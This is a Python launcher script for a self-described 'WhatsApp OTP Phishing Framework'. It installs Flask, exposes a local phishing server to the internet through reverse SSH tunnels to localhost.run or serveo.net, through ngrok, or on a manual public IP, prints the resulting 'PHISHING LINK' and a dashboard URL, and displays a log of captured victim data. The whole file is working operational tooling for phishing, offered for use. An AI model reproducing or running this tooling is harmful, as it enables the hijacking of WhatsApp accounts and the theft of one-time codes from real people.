#!/usr/bin/env python3
import subprocess, sys, os, re, time

DEPS = ["flask"]

def install():
    for p in DEPS:
        try: __import__(p)
        except ImportError:
            print(f"[*] Installing {p}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", p])

def tunnel():
    print("\n[*] Tunnel Setup")
    print("  [1] localhost.run  (SSH, no signup)")
    print("  [2] ngrok          (needs install)")
    print("  [3] Serveo         (SSH, no signup)")
    print("  [4] Manual IP      (VPS / port forward)")

    ch = input("\n  Select [1-4]: ").strip()

    if ch == "1":
        print("[*] Connecting to localhost.run ...")
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no",
             "-R", "80:localhost:5000", "nokey@localhost.run"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            print(f"  {line.strip()}")
            m = re.search(r"(https?://[a-z0-9]+\.localhost\.run)", line)
            if m:
                url = m.group(1)
                print(f"\n  [✓] URL: {url}")
                return proc, url
        return None, None

    elif ch == "2":
        proc = subprocess.Popen(["ngrok", "http", "5000"],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(4)
        try:
            import requests
            r = requests.get("http://127.0.0.1:4040/api/tunnels").json()
            url = r["tunnels"][0]["public_url"]
            if url.startswith("http://"): url = url.replace("http://", "https://")
            print(f"\n  [✓] URL: {url}")
            return proc, url
        except:
            print("[!] Could not get ngrok URL. Check http://127.0.0.1:4040")
            return proc, None

    elif ch == "3":
        print("[*] Connecting to serveo.net ...")
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no",
             "-R", "80:localhost:5000", "serveo.net"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            print(f"  {line.strip()}")
            m = re.search(r"(https?://[a-z0-9]+\.serveo\.net)", line)
            if m:
                url = m.group(1)
                print(f"\n  [✓] URL: {url}")
                return proc, url
        return None, None

    elif ch == "4":
        ip = input("  Enter public IP/domain: ").strip()
        url = f"http://{ip}:5000"
        print(f"\n  [✓] URL: {url}")
        print("  [!] Make sure port 5000 is forwarded")
        return None, url

    return None, None


def main():
    os.system("cls" if os.name == "nt" else "clear")
    print("""
  ╔═══════════════════════════════════════════════╗
  ║      WhatsApp OTP Phishing Framework          ║
  ╠═══════════════════════════════════════════════╣
  ║   [1] Full Setup  (deps + tunnel + server)    ║
  ║   [2] Server Only (localhost:5000)             ║
  ║   [3] View Captured Data                      ║
  ║   [4] Exit                                    ║
  ╚═══════════════════════════════════════════════╝
    """)
    ch = input("  Select: ").strip()

    if ch == "1":
        install()
        tp, url = tunnel()
        if url:
            print(f"\n  {'='*50}")
            print(f"  PHISHING LINK  → {url}")
            print(f"  DASHBOARD      → {url}/dashboard")
            print(f"  LOG FILE       → captured_data.log")
            print(f"  {'='*50}\n")
        print("[*] Starting server ...\n")
        subprocess.run([sys.executable, "phish_server.py"])
        if tp: tp.terminate()

    elif ch == "2":
        install()
        print("[*] http://localhost:5000")
        print("[*] Dashboard: http://localhost:5000/dashboard\n")
        subprocess.run([sys.executable, "phish_server.py"])

    elif ch == "3":
        if os.path.exists("captured_data.log"):
            with open("captured_data.log") as f: print(f.read())
        else:
            print("[!] No data yet.")
        input("\nEnter to go back...")
        main()

    elif ch == "4":
        sys.exit(0)


if __name__ == "__main__":
    main()